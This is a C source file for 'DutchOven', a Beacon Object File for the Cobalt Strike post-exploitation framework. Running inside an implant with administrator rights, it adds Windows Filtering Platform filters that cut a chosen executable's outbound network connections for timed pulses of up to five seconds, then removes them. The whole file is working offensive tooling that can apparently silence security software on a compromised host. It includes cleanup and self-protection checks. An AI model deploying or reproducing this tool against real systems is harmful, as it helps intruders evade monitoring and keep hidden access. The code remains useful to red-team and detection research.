#include <fwpmu.h>
#include <rpc.h>
#include <windows.h>

#include "beacon.h"
#include "bofdefs.h"

/*
 * The BOF is deliberately independent of the standalone runtime: it has no CRT, accepts one
 * target, and performs one bounded synchronous pulse before returning to Beacon.
 */
#define DO_BOF_PATH_CAPACITY 520U
#define DO_BOF_FILTER_COUNT 2U
#define DO_BOF_PROFILE_LIGHT 0
#define DO_BOF_PROFILE_BROWNOUT 1
#define DO_BOF_PROFILE_HEAVY 2
#define DO_BOF_PROFILE_BLACKOUT 3

#ifndef FWPM_SESSION_FLAG_DYNAMIC
#define FWPM_SESSION_FLAG_DYNAMIC 0x00000001U
#endif
#ifndef FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT
#define FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT 0x00000008U
#endif

static const GUID do_bof_layer_connect_v4 = {
    0xc38d57d1, 0x05a7, 0x4c33, {0x90, 0x4f, 0x7f, 0xbc, 0xee, 0xe6, 0x0e, 0x82}
};
static const GUID do_bof_layer_connect_v6 = {
    0x4a72393b, 0x319f, 0x44bc, {0x84, 0xc3, 0xba, 0x54, 0xdc, 0xb3, 0xb6, 0xb4}
};
static const GUID do_bof_condition_app_id = {
    0xd78e1e87, 0x8644, 0x4ea5, {0x94, 0x37, 0xd8, 0x09, 0xec, 0xef, 0xc9, 0x71}
};

static wchar_t do_bof_session_name[] = L"DutchOven BOF dynamic session";
static wchar_t do_bof_session_description[] = L"Non-persistent application-scoped pulse";
static wchar_t do_bof_sublayer_name[] = L"DutchOven BOF dynamic gate";
static wchar_t do_bof_sublayer_description[] = L"Removed when the BOF closes its session";
static wchar_t do_bof_filter_name[] = L"DutchOven BOF application block";
static wchar_t do_bof_filter_description[] = L"Short dynamic-session filter";

typedef struct {
    /* All resources owned by one invocation; no state survives after go returns. */
    HANDLE engine;
    FWP_BYTE_BLOB *app_id;
    GUID sublayer_key;
    UINT64 filter_ids[DO_BOF_FILTER_COUNT];
    UINT32 filter_count;
} do_bof_gate;

static void do_bof_zero(void *memory, SIZE_T length) {
    /* Avoid a memset import: BOFs resolve only the explicitly declared Beacon/Win32 functions. */
    unsigned char *cursor = (unsigned char *)memory;
    while (length > 0U) {
        *cursor++ = 0U;
        length--;
    }
}

static int do_bof_absolute_path(const wchar_t *path) {
    wchar_t drive;
    if (path == NULL) {
        return 0;
    }
    drive = path[0];
    return ((drive >= L'A' && drive <= L'Z') || (drive >= L'a' && drive <= L'z')) &&
           path[1] == L':' && (path[2] == L'\\' || path[2] == L'/') && path[3] != L'\0';
}

static DWORD do_bof_profile_ms(int profile) {
    switch (profile) {
        case DO_BOF_PROFILE_LIGHT:
            return 500U;
        case DO_BOF_PROFILE_BROWNOUT:
            return 1500U;
        case DO_BOF_PROFILE_HEAVY:
            return 3500U;
        case DO_BOF_PROFILE_BLACKOUT:
            return 5000U;
        default:
            return 0U;
    }
}

static const char *do_bof_profile_name(int profile) {
    switch (profile) {
        case DO_BOF_PROFILE_LIGHT:
            return "light";
        case DO_BOF_PROFILE_BROWNOUT:
            return "brownout";
        case DO_BOF_PROFILE_HEAVY:
            return "heavy";
        case DO_BOF_PROFILE_BLACKOUT:
            return "blackout";
        default:
            return "invalid";
    }
}

static void do_bof_release(do_bof_gate *gate) {
    /* Engine close tears down every object in the dynamic session if explicit deletion failed. */
    if (gate->engine != NULL) {
        (void)FwpmEngineClose0(gate->engine);
        gate->engine = NULL;
    }
    if (gate->app_id != NULL) {
        FwpmFreeMemory0((void **)&gate->app_id);
        gate->app_id = NULL;
    }
    gate->filter_count = 0U;
}

static DWORD do_bof_open(do_bof_gate *gate, const wchar_t *path) {
    FWPM_SESSION0 session;
    FWPM_SUBLAYER0 sublayer;
    RPC_STATUS uuid_status;
    DWORD status;

    do_bof_zero(gate, sizeof(*gate));
    do_bof_zero(&session, sizeof(session));
    session.displayData.name = do_bof_session_name;
    session.displayData.description = do_bof_session_description;
    /* The dynamic flag is the cleanup guarantee if Beacon interrupts normal control flow. */
    session.flags = FWPM_SESSION_FLAG_DYNAMIC;
    session.txnWaitTimeoutInMSec = 3000U;

    status = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, &session, &gate->engine);
    if (status != ERROR_SUCCESS) {
        return status;
    }

    uuid_status = UuidCreate(&gate->sublayer_key);
    if (uuid_status != RPC_S_OK && uuid_status != RPC_S_UUID_LOCAL_ONLY) {
        do_bof_release(gate);
        return (DWORD)uuid_status;
    }

    do_bof_zero(&sublayer, sizeof(sublayer));
    sublayer.subLayerKey = gate->sublayer_key;
    sublayer.displayData.name = do_bof_sublayer_name;
    sublayer.displayData.description = do_bof_sublayer_description;
    /* Match the standalone gate's high-priority, invocation-scoped sublayer. */
    sublayer.weight = 0xffffU;
    status = FwpmSubLayerAdd0(gate->engine, &sublayer, NULL);
    if (status != ERROR_SUCCESS) {
        do_bof_release(gate);
        return status;
    }

    status = FwpmGetAppIdFromFileName0(path, &gate->app_id);
    if (status != ERROR_SUCCESS) {
        do_bof_release(gate);
    }
    return status;
}

static DWORD do_bof_add_filter(do_bof_gate *gate, const GUID *layer, UINT64 *filter_id) {
    FWPM_FILTER_CONDITION0 condition;
    FWPM_FILTER0 filter;

    do_bof_zero(&condition, sizeof(condition));
    condition.fieldKey = do_bof_condition_app_id;
    condition.matchType = FWP_MATCH_EQUAL;
    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    condition.conditionValue.byteBlob = gate->app_id;

    do_bof_zero(&filter, sizeof(filter));
    filter.displayData.name = do_bof_filter_name;
    filter.displayData.description = do_bof_filter_description;
    filter.layerKey = *layer;
    filter.subLayerKey = gate->sublayer_key;
    filter.weight.type = FWP_UINT8;
    filter.weight.uint8 = 15U;
    filter.numFilterConditions = 1U;
    filter.filterCondition = &condition;
    filter.action.type = FWP_ACTION_BLOCK;
    /* Make the block terminal at this decision point rather than advisory. */
    filter.flags = FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT;
    return FwpmFilterAdd0(gate->engine, &filter, NULL, filter_id);
}

static DWORD do_bof_block(do_bof_gate *gate) {
    /* Publish the IPv4 and IPv6 filters together; never leave a single-family brownout. */
    DWORD status = FwpmTransactionBegin0(gate->engine, 0U);
    if (status != ERROR_SUCCESS) {
        return status;
    }

    status = do_bof_add_filter(gate, &do_bof_layer_connect_v4, &gate->filter_ids[0]);
    if (status == ERROR_SUCCESS) {
        status = do_bof_add_filter(gate, &do_bof_layer_connect_v6, &gate->filter_ids[1]);
    }
    if (status != ERROR_SUCCESS) {
        (void)FwpmTransactionAbort0(gate->engine);
        return status;
    }

    status = FwpmTransactionCommit0(gate->engine);
    if (status == ERROR_SUCCESS) {
        gate->filter_count = DO_BOF_FILTER_COUNT;
    }
    return status;
}

static DWORD do_bof_pass(do_bof_gate *gate) {
    UINT32 index;
    DWORD status;
    if (gate->filter_count == 0U) {
        return ERROR_SUCCESS;
    }

    status = FwpmTransactionBegin0(gate->engine, 0U);
    if (status != ERROR_SUCCESS) {
        return status;
    }
    for (index = 0U; index < gate->filter_count; index++) {
        status = FwpmFilterDeleteById0(gate->engine, gate->filter_ids[index]);
        /* An already-absent filter satisfies the pass-state invariant. */
        if (status != ERROR_SUCCESS && status != (DWORD)FWP_E_FILTER_NOT_FOUND) {
            (void)FwpmTransactionAbort0(gate->engine);
            return status;
        }
    }
    status = FwpmTransactionCommit0(gate->engine);
    if (status == ERROR_SUCCESS) {
        gate->filter_count = 0U;
    }
    return status;
}

void go(char *args, int length) {
    datap parser;
    do_bof_gate gate;
    wchar_t full_path[DO_BOF_PATH_CAPACITY];
    wchar_t current_process[DO_BOF_PATH_CAPACITY];
    wchar_t *path;
    int path_bytes = 0;
    int profile;
    DWORD pulse_ms;
    DWORD path_length;
    DWORD attributes;
    DWORD status;
    DWORD cleanup_status;

    /* Aggressor packs a NUL-terminated UTF-16 path followed by a 32-bit profile identifier. */
    do_bof_zero(&gate, sizeof(gate));
    do_bof_zero(full_path, sizeof(full_path));
    do_bof_zero(current_process, sizeof(current_process));
    BeaconDataParse(&parser, args, length);
    path = (wchar_t *)BeaconDataExtract(&parser, &path_bytes);
    if (path == NULL || path_bytes < (int)(5U * sizeof(wchar_t)) ||
        (path_bytes % (int)sizeof(wchar_t)) != 0 ||
        path[(path_bytes / (int)sizeof(wchar_t)) - 1] != L'\0' ||
        BeaconDataLength(&parser) < (int)sizeof(int)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "DutchOven: expected a packed Unicode path and profile identifier");
        return;
    }

    profile = BeaconDataInt(&parser);
    pulse_ms = do_bof_profile_ms(profile);
    if (pulse_ms == 0U || !do_bof_absolute_path(path)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "DutchOven: target must be an absolute local path and profile must be 0..3");
        return;
    }
    if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_ERROR, "DutchOven: an elevated Administrator token is required");
        return;
    }

    path_length = GetFullPathNameW(path, DO_BOF_PATH_CAPACITY, full_path, NULL);
    if (path_length == 0U || path_length >= DO_BOF_PATH_CAPACITY) {
        BeaconPrintf(CALLBACK_ERROR, "DutchOven: unable to resolve the target path");
        return;
    }
    attributes = GetFileAttributesW(full_path);
    if (attributes == INVALID_FILE_ATTRIBUTES ||
        (attributes & FILE_ATTRIBUTE_DIRECTORY) != 0U) {
        BeaconPrintf(CALLBACK_ERROR, "DutchOven: target is not an executable file");
        return;
    }

    /* Self-gating could sever Beacon's transport before this inline BOF can clean up. */
    path_length = GetModuleFileNameW(NULL, current_process, DO_BOF_PATH_CAPACITY);
    if (path_length > 0U && path_length < DO_BOF_PATH_CAPACITY &&
        lstrcmpiW(full_path, current_process) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
                     "DutchOven: refusing to gate the process that is hosting this BOF");
        return;
    }

    status = do_bof_open(&gate, full_path);
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "DutchOven: WFP setup failed with status %lu", status);
        return;
    }
    status = do_bof_block(&gate);
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "DutchOven: filter transaction failed with status %lu",
                     status);
        do_bof_release(&gate);
        BeaconPrintf(CALLBACK_OUTPUT, "DutchOven: CLEAN filters=0 session=closed");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "DutchOven: BLOCK profile=%s pulse_ms=%lu filters=2",
                 do_bof_profile_name(profile), pulse_ms);
    /* Inline execution blocks Beacon, so profiles cap this single sleep at five seconds. */
    Sleep(pulse_ms);

    /* Explicit deletion produces a clear audit trail; session close remains authoritative cleanup. */
    cleanup_status = do_bof_pass(&gate);
    do_bof_release(&gate);
    if (cleanup_status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
                     "DutchOven: explicit filter removal returned %lu; dynamic session closed",
                     cleanup_status);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "DutchOven: CLEAN filters=0 session=closed");
}
